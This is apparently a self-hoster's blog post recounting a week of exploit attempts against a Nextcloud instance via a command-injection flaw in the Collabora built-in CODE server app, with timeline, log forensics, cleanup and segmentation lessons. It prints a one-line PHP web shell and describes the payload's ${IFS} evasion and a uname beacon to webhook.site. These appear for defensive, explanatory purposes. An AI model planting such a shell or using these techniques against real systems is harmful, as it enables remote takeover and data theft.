---
title: "The Nextcloud Break-In That Wasn't – 39,000 Knocks, Zero Shells"
date: '2026-11-07'
description: 'I sat down to patch PHP2Shell and found out that my Nextcloud had spent a week fending off a Collabora exploit. A forensic dig through the logs, and why a restart can be the moment you get hit.'
image: /images/blog/2026/11/nextcloud-break-in-that-wasnt.jpeg
categories:
  - Security
  - Tools
tags:
  - nextcloud
  - collabora
  - richdocumentscode
  - php2shell
  - cve
  - docker
  - incident-response
  - forensics
  - self-hosting
---

Every mole thinks its burrow is safe. The entrance is small, the tunnels are dark, and who would want to dig their way into a molehill anyway?

Tonight I sat down to do something boring: patch PHP2Shell (CVE-2026-109618/-109619) on my self-hosted Nextcloud. While checking what else was outdated, I noticed that the Collabora app was still on a version from May 2025. A quick look at the advisories later, I wasn't doing something boring anymore. I was reading access logs and finding out that someone had been knocking on my door about 39,000 times in September.

Spoiler, so that nobody worries: as far as I can tell, they never got in. But it was closer than I like, and the way it happened is worth telling.

| Thing | State before |
|---|---|
| Nextcloud | 31.0.7 in Docker, public behind a reverse proxy |
| Collabora app | „Collabora Online – Built-in CODE Server“ (`richdocumentscode`) 25.4.202 |
| Image | Pinned to a fixed digest, unchanged for months |
| Support | Nextcloud 31 is end of life |

## The Hole: CVE-2026-110447

The built-in CODE server app ships a `proxy.php`. When the CODE server isn't running, that script starts it – and on the way passes parts of the incoming request to the shell without checking them. Classic command injection, CVSS 9.2, no login needed. Every version before 26.4.303 is affected.

The nasty detail is the condition: it only works while the CODE server is **not** running. On a box that's been up for weeks, the window is closed. But every restart and every update opens it again, until the first request starts the server.

Also worth knowing: disabling the app doesn't help. Only updating it or removing it does.

## The Timeline

All times UTC.

- **9 Sep:** the fix is committed to the app's repository.
- **10 Sep:** first documented attacks in the wild.
- **11 Sep:** version 26.4.303 with the fix is released. My pinned Nextcloud 31 never sees it.
- **12 Sep, 00:46:58:** I recreate the Nextcloud container while moving my stacks from Portainer into a versioned Compose directory. The CODE server isn't running afterwards. The window is open.
- **12 Sep, 00:47:12:** fourteen seconds later, `139.28.18.122` asks for `shxecff8.php?c=id`. Answer: 404. They're checking whether their shell is already there.
- **12 Sep, 00:49:13:** the first exploit request to `/custom_apps/richdocumentscode/proxy.php?status`. Answer: **HTTP 200**.
- **12 Sep, 00:49:21:** the CODE server starts – eight seconds after the exploit request. Most likely that very request started it.
- **12 Sep, 00:50:** POST attempts on `/cool/convert-to/pdf`, answered with 403.
- **12 to 18 Sep:** sustained fire every few minutes: exploit request, then fetch the shell. From 01:56 a second IP joins in, `89.38.98.50`. Around 39,000 exploit requests, all answered with 200. Every single shell fetch: **404**.
- **18 Sep, 19:46:** the last request to the right path.
- **24 Sep:** version 26.4.402 is released.
- **3 Oct:** public warning in the Nextcloud forum.
- **14 Oct:** CVE and official advisory published.
- **Late Oct to early Nov:** more scanners from other IPs, this time with downloaders and uploader forms. They aim at `/apps/…` instead of `/custom_apps/…` and get a 404.
- **6 Nov:** PHP2Shell prep, the old app version catches my eye, the logs get read.

Read that again: the exploits were in the wild one day after the fix was committed, two days before the release, and **more than a month before the CVE**. Anyone waiting for the advisory was already too late.

## What the Payload Wanted

The payload sat Base64-encoded in the URL, with `${IFS}` instead of spaces – the usual trick to get past anything that splits on whitespace. It was supposed to do two things:

1. Drop a one-line web shell called `shxecff8.php` into the web root. In essence:

   ```php
   <?php shell_exec($_GET['c']);
   ```

2. Report `uname -a` to a `webhook.site` address, as a "we're in" signal for the attacker.

After that, everything else would have come through `shxecff8.php?c=…`. Which is why the attacker kept asking for it.

## The Forensic Dig

A 200 on the exploit request looks scary. But a 200 only means `proxy.php` answered, not that the injected command did anything. The interesting question is what came next. So I dug.

These are the kinds of checks I ran, in case your burrow runs the same app:

```bash
# Which version of the app is installed?
docker exec -u www-data nextcloud php occ app:list | grep -A1 richdocumentscode

# Any web shell lying around?
docker exec nextcloud find /var/www/html \( -name 'shx*.php' -o -name 'shrf*.php' \)

# Files changed in the attack window, outside the data directory
docker exec nextcloud find /var/www/html -path /var/www/html/data -prune -o \
  -type f -newermt 2026-09-09 ! -newermt 2026-09-17 -print

# Exploit requests and shell fetches with their status codes
docker logs nextcloud 2>&1 | grep -E 'richdocumentscode/proxy.php|shx[a-z0-9]+\.php'
```

The results:

- No `shx*.php`, `shrf*.php` or similar file anywhere in the container, and no match for the known hash of the shell.
- The app folder was unchanged since May 2025.
- Between 9 and 16 September, not a single file outside the data directory was modified.
- No foreign processes, only the CODE server. No odd cron entries.
- And the best evidence: every single fetch of the shell over six days ended in a 404. The attackers never reached their own shell.

Why the injection didn't land in those eight seconds, I can't say for sure. What I can say is that the shell never existed. The one thing I can't rule out is that the `uname -a` made it out to the webhook – outgoing connections weren't logged. So the attacker may know my kernel version. They're welcome to it.

**Verdict:** very likely failed. Not "certainly", but "very likely" with good evidence.

## Cleaning Up the Tunnel

Patching can wipe out evidence, so the digging came first. Then:

1. **Backups first.** VM snapshot and database dumps.
2. **Close the door during maintenance.** With this kind of bug, every restart is an attack window. So Nextcloud was only reachable from the LAN and via VPN, enforced by an access list in the reverse proxy.
3. **Upgrade one major at a time:** 31.0.7 → 31.0.14 → 32.0.15 → 33.0.10 → 34.0.5 → 35.0.2.
4. The very first step already brought `richdocumentscode` 26.4.502. Hole closed.
5. **PHP2Shell**, the reason I sat down in the first place, fixed along the way. Now on PHP 8.5.12.
6. Opened Nextcloud to the public again and tested Collabora.

## And If the Shell Had Hatched?

Let's be honest about what a working shell would have meant. `shell_exec` runs as the web server user, so the attacker would have had everything Nextcloud has: the files of every user, `config.php` with the database password and the secrets, and the database itself. No container in the world protects an app's own data from the app's own process. That part would have been a real breach, full stop.

What the layers around it do is keep a break-in from turning into a takeover of the whole burrow. The shell lands in a container, not on the host: as `www-data`, without root, in a filesystem that is thrown away and rebuilt from the image on the next update. To get out, the attacker needs a second bug – a kernel exploit, or a mistake of mine like a mounted Docker socket, `--privileged` or a host path that has no business being there. A VM around the container adds another wall, and the snapshot gives a clean state to go back to.

The network is the next layer. A server that faces the internet belongs in its own segment, where it can't reach the NAS, the home automation or the admin interfaces of the rest of the burrow – then a shell on it is a dead-end tunnel instead of a crossroads. My burrow has exactly that: a DMZ, separate VLANs, the works. Or so I thought, until I wrote this paragraph and went to check.

The DMZ exists. But the Docker host that runs Nextcloud has grown a leg into several other networks over the years, one convenient shortcut at a time, and nothing filters between them. So I ran a few `curl` calls from inside the Nextcloud container – exactly what the web shell could have done – and got answers from places a public web app has no business talking to. The segmentation was real on paper and in the switch config. It just had a tunnel dug straight through it from the inside, and I had dug it myself.

I won't draw you a map of that tunnel while I'm still filling it in. The lesson is the useful part: **segmentation isn't what you configured, it's what a process inside the box can actually reach.** Test it from where the attacker would stand, not from your admin laptop.

And it pays to look in the other direction too: this payload wanted to phone home to `webhook.site`, and the later scanners wanted to download their tools. A container whose outgoing traffic is limited to what it really needs – updates, the App Store, maybe mail – would have left both of them standing in the dark. Which brings me back to the to-do list at the end of this post.

## What the Mole Learned

- **A restart can be the attack.** The first knock came fourteen seconds after the container was recreated. Somebody scans constantly, and my window was open right then. If a bug only works in a certain state, assume someone is waiting for that state.
- **A pinned image protects you from unwanted updates, not from missing ones.** Pinning was a deliberate choice. But on an end-of-life Nextcloud the App Store updates simply stopped arriving, and I didn't notice.
- **Keep your logs.** The container and proxy logs were the only reason I could show that the shell never existed. Without them, I'd be reinstalling from scratch tonight.
- **A 200 isn't a success.** What counts is what happens next. Here it was the follow-up fetch of the shell: 404, every time.
- **Patching doesn't clean up.** After a hole like this, look for traces first and update afterwards.
- **Check your segmentation from the inside.** A DMZ on paper is worth nothing if the host has a leg in every other network.

Two items for the to-do list: cut the Docker host's shortcuts into the rest of the burrow, and log outgoing connections from containers that have no business talking to the internet. Next time I'd like to know for sure who my kernel version was sent to.

Now excuse me, I have a few more stacks to check – and a tunnel to fill. The burrow is quiet again, but I'm listening a bit closer to the walls.
